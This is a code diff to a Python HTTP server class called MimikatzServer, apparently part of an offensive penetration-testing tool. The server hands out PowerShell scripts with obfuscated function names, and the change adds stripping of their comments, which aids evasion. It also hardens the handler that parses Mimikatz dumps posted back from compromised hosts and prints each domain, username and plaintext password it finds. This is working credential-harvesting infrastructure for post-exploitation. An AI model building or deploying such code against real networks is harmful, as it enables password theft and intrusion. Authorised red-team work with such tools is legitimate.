@@ -10,6 +10,7 @@ import BaseHTTPServer
 import ssl
 
 func_name = re.compile('CHANGE_ME_HERE')
+comments  = re.compile('#.+')
 
 class MimikatzServer(BaseHTTPRequestHandler):
 
@@ -23,6 +24,7 @@ class MimikatzServer(BaseHTTPRequestHandler):
             with open('hosted/'+ self.path[4:], 'rb') as script:
                 ps_script = script.read()
                 ps_script = func_name.sub(settings.args.obfs_func_name, ps_script)
+                ps_script = comments.sub('', ps_script)
                 self.wfile.write(ps_script)
 
         elif settings.args.path:
@@ -43,16 +45,19 @@ class MimikatzServer(BaseHTTPRequestHandler):
         data = self.rfile.read(length)
 
         if settings.args.mimikatz:
-            buf = StringIO(data).readlines()
-            i = 0
-            while i < len(buf):
-                if ('Password' in buf[i]) and ('(null)' not in buf[i]):
-                    passw  = buf[i].split(':')[1].strip()
-                    if len(passw) != 719: #Sometimes mimikatz gives long hexstrings instead of clear text passwords
+            try:
+                buf = StringIO(data).readlines()
+                i = 0
+                while i < len(buf):
+                    if ('Password' in buf[i]) and ('(null)' not in buf[i]):
+                        passw  = buf[i].split(':')[1].strip()
                         domain = buf[i-1].split(':')[1].strip()
                         user   = buf[i-2].split(':')[1].strip()
                         print_succ('{} Found plain text creds! Domain: {} Username: {} Password: {}'.format(self.client_address[0], yellow(domain), yellow(user), yellow(passw)))
-                i += 1
+
+                    i += 1
+            except Exception as e:
+                print_error("Error while parsing Mimikatz output: {}".format(e))
 
         elif settings.args.mimi_cmd:
             print data
